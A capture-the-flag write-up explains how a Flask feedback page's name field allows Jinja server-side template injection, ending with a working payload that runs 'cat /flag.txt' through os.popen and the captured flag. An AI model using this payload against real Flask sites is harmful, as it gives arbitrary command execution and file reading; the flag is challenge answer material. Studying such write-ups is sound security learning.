---
title: "A personalised thank you"
description: "RISC intro2web challenge 2"
pubDate: "Aug 26 2025"
heroImage: "/hero/RISC.webp"
tags: ["cyber", "python", "flask", "ctf", "exploit"]
---

## Challenge description

Thank you for your feedback { name }

Flag is in /flag.txt

---

## Approach

Lets have a look at the feedback page.

We can input a name and a message and upon submitting are presented with "Thank you for your feedback " and our name.

We know that the site is built with Python Flask, which uses Jinja for templating allowing loading html files and substituting variables and logic before serving to the client.

E.g.

```html
<html>
	<body>
		<h1>{{ title }}</h1>
	</body>
</html>
```

So if we pass a Jinja template into our name, and the name is being passed into a template string, Jinja will evaluate the input.

We can test this by using `{{}}` as our name and we see:

> Thank you for your feedback

Our input was evaluated by Jinja into nothing.

We can abuse the arbitrary Jinja execution to get arbitrary bash execution and cat the flag located in `/flag.txt`

### Python implementation

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
```

> Thank you for your feedback RISC{y0ur_f33db4ck_1snt_p4rt1cul4rly_s4f3!\_e85dae1c0b362b4c7019905ca3a56ecf}

So our flag is:

```
RISC{y0ur_f33db4ck_1snt_p4rt1cul4rly_s4f3!_e85dae1c0b362b4c7019905ca3a56ecf}
```
